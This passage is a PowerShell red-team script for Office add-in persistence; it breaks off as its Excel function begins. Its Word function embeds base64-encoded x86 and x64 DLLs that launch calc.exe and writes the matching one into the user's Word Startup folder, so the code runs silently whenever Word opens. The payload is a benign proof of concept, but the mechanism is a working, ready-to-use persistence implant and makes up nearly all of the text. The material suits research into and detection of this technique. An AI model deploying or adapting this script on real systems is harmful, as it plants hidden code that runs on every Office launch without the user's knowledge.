<#
.SYNOPSIS
This script allows you to test Office-based persistence methods mentioned in 《add-in-opportunities-for-office-persistence》.
Support methods:
- WLL "Add-Ins" for Word
- XLL "Add-Ins" for Excel
- VBA add-ins for Excel
- VBA add-ins for PowerPoint 

Author: 3gstudent@3gstudent
Office-based persistence method Author: William Knowles@william_knows
Link:https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/
License: BSD 3-Clause

Can be used to maintain persistence by Word, Excel and Powerpoint.
Test success on Office 2010 and Office 2013. 
More to test.
#>

Function WordWLL
{
    # Use WLL "Add-Ins" for Word
    # Release file： %appdata%\Roaming\Microsoft\Word\Startup\calc.wll
    # Pop up the calculator when you start winword.exe
    $OfficePath = "C:\Program Files\Microsoft Office\"+"Office*"
    $calcwllx86 = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAACjAQMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"   
    $calcwllx64 = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADKi3y2ZKwAAzV0g0mbU////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAACQQAAAwIwAAQBAAAF8QAACIIgAAYBAAAL4QAACoIgAAwBAAAAsTAACMIgAADBMAAEkTAAD0IgAATBMAAIIUAACwIgAAhBQAAM0UAACoIgAA0BQAAKEVAAAEIwAAABYAAE0WAAAMIwAAgBYAAM4WAACoIgAA0BYAAIAXAAA4IwAAgBcAAJcXAAAwIwAAmBcAAFAYAABYIwAAUBgAAIgYAABkIwAAiBgAAMAYAABkIwAAIBkAAEUZAADsIgAARRkAAF8ZAADsIgAAYBkAAIAZAADsIgAAgBkAAJsZAADsIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAGAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAgAAADAAAIAAAAAAAAAAAAAAAAAAAAEACQQAAEgAAABgUAAAfQEAAAAAAAAAAAAAAAAAAAAAAAA8P3htbCB2ZXJzaW9uPScxLjAnIGVuY29kaW5nPSdVVEYtOCcgc3RhbmRhbG9uZT0neWVzJz8+DQo8YXNzZW1ibHkgeG1sbnM9J3VybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxJyBtYW5pZmVzdFZlcnNpb249JzEuMCc+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSdhc0ludm9rZXInIHVpQWNjZXNzPSdmYWxzZScgLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAUAAAA+KAAoVChWKHIoQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    Try  
    {  
        $OfficeVersion=dir -name $OfficePath -ErrorAction Stop  
        $Ver=$OfficeVersion.Substring( $OfficeVersion.LastIndexOf("e")+1 )
        Write-Host "[+] Microsoft Office Version:" $Ver    
    }  
    Catch  
    {  
        Write-Host "[!] I can't find Microsoft Office!" 
        Write-Host "[+] Please reset a correct path." 
        return 
    }   
    if ([Environment]::Is64BitOperatingSystem)
    {
        Write-Host "[+] OS: x64"
        $fileContent = $calcwllx64        
        Try  
        {  
            $OfficeMainPath=$OfficePath.Substring(0,$OfficePath.LastIndexOf("\")+1)+"MEDIA"
            dir $OfficeMainPath | Out-Null -ErrorAction Stop  
            Write-Host "[+] Microsoft Office bit: 64-bit" 
            Write-Host "[+] I copy calc_x64.wll"                     
        }
        Catch  
        { 
            Write-Host "[+] Microsoft Office bit: 32-bit"
            $fileContent = $calcwllx86
            Write-Host "[+] I copy calc_x86.wll"            
        }  
    }
    else
    {
        Write-Host "[+] OS: x86"
        $fileContent = $calcwllx86
    }
    $fileContentBytes = [System.Convert]::FromBase64String($fileContent) 
    [System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\Word\Startup\calc.wll",$fileContentBytes)
    Write-Host "[+] Done."
 }

Function ExcelXLL
{
    # Use XLL "Add-Ins" for Excel
